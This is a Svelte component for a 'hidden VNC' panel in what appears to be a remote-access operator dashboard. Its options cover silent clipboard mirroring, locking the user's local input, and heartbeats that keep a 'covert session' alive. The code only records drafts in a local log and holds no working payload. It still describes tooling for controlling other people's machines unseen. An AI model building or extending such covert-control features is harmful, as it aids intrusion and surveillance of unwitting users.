<script lang="ts">
        import { Button } from '$lib/components/ui/button/index.js';
        import { Input } from '$lib/components/ui/input/index.js';
        import { Label } from '$lib/components/ui/label/index.js';
        import { Switch } from '$lib/components/ui/switch/index.js';
        import {
                Select,
                SelectContent,
                SelectItem,
                SelectTrigger
        } from '$lib/components/ui/select/index.js';
        import {
                Card,
                CardContent,
                CardDescription,
                CardHeader,
                CardTitle
        } from '$lib/components/ui/card/index.js';
        import { getClientTool } from '$lib/data/client-tools';
        import type { Client } from '$lib/data/clients';
        import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
        import type { WorkspaceLogEntry } from '$lib/workspace/types';

        const { client } = $props<{ client: Client }>();

        const tool = getClientTool('hidden-vnc');

        let quality = $state<'lossless' | 'balanced' | 'bandwidth'>('balanced');
        let monitor = $state('Primary');
        let captureCursor = $state(true);
        let clipboardSync = $state(false);
        let blockLocalInput = $state(false);
        let heartbeatInterval = $state(30);
        let log = $state<WorkspaceLogEntry[]>([]);

        function formatPlan(): string {
                return `Monitor ${monitor} · ${quality} quality · cursor ${captureCursor ? 'synced' : 'hidden'} · clipboard ${clipboardSync ? 'mirrored' : 'isolated'} · input ${blockLocalInput ? 'locked' : 'passthrough'} · heartbeat ${heartbeatInterval}s`;
        }

        function stageSession() {
                log = appendWorkspaceLog(
                        log,
                        createWorkspaceLogEntry('Hidden VNC session drafted', formatPlan(), 'draft')
                );
        }

        function queueSession() {
                log = appendWorkspaceLog(
                        log,
                        createWorkspaceLogEntry('Hidden VNC session queued', formatPlan(), 'queued')
                );
        }
</script>

<div class="space-y-6">
        <Card>
                <CardHeader>
                        <CardTitle class="text-base">Session parameters</CardTitle>
                        <CardDescription>
                                Define how the hidden VNC worker should negotiate buffers and input forwarding with the agent.
                        </CardDescription>
                </CardHeader>
                <CardContent class="space-y-6">
                        <div class="grid gap-4 md:grid-cols-2">
                                <div class="grid gap-2">
                                        <Label for="vnc-monitor">Preferred monitor</Label>
                                        <Input
                                                id="vnc-monitor"
                                                placeholder="Primary display"
                                                bind:value={monitor}
                                        />
                                        <p class="text-xs text-muted-foreground">
                                                The agent advertises active monitors when a session handshake is established.
                                        </p>
                                </div>
                                <div class="grid gap-2">
                                        <Label for="vnc-quality">Encoding profile</Label>
                                        <Select type="single" value={quality} onValueChange={(value) => (quality = value as typeof quality)}>
                                                <SelectTrigger id="vnc-quality" class="w-full">
                                                        <span class="truncate capitalize">{quality}</span>
                                                </SelectTrigger>
                                                <SelectContent>
                                                        <SelectItem value="lossless">Lossless</SelectItem>
                                                        <SelectItem value="balanced">Balanced</SelectItem>
                                                        <SelectItem value="bandwidth">Bandwidth saver</SelectItem>
                                                </SelectContent>
                                        </Select>
                                </div>
                        </div>

                        <div class="grid gap-4 md:grid-cols-3">
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Mirror cursor</p>
                                                <p class="text-xs text-muted-foreground">Synchronise remote cursor movement</p>
                                        </div>
                                        <Switch bind:checked={captureCursor} />
                                </label>
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Clipboard tunnel</p>
                                                <p class="text-xs text-muted-foreground">Mirror clipboard events silently</p>
                                        </div>
                                        <Switch bind:checked={clipboardSync} />
                                </label>
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Lock local input</p>
                                                <p class="text-xs text-muted-foreground">Freeze keyboard/mouse while controlling</p>
                                        </div>
                                        <Switch bind:checked={blockLocalInput} />
                                </label>
                        </div>

                        <div class="grid gap-2 md:w-1/3">
                                <Label for="vnc-heartbeat">Heartbeat interval (seconds)</Label>
                                <Input
                                        id="vnc-heartbeat"
                                        type="number"
                                        min={10}
                                        step={5}
                                        bind:value={heartbeatInterval}
                                />
                                <p class="text-xs text-muted-foreground">
                                        Heartbeats keep the covert session alive and assist with reconnect orchestration.
                                </p>
                        </div>

                        <div class="flex flex-wrap gap-3">
                                <Button type="button" variant="outline" onclick={stageSession}>Save draft</Button>
                                <Button type="button" onclick={queueSession}>Queue session</Button>
                        </div>
                </CardContent>
        </Card>

        <Card class="border-dashed">
                <CardHeader>
                        <CardTitle class="text-base">Implementation notes</CardTitle>
                        <CardDescription>
                                Guidance for wiring the VNC transport into the shared command channel.
                        </CardDescription>
                </CardHeader>
                <CardContent class="space-y-3 text-sm text-muted-foreground">
                        <ul class="list-disc space-y-2 pl-5">
                                <li>Reuse the remote desktop SSE transport for frame delivery with an alternate topic.</li>
                                <li>Negotiate AES-GCM stream keys before enabling clipboard synchronisation.</li>
                                <li>Record operator interactions to support audit trails and incident reviews.</li>
                        </ul>
                </CardContent>
        </Card>
</div>
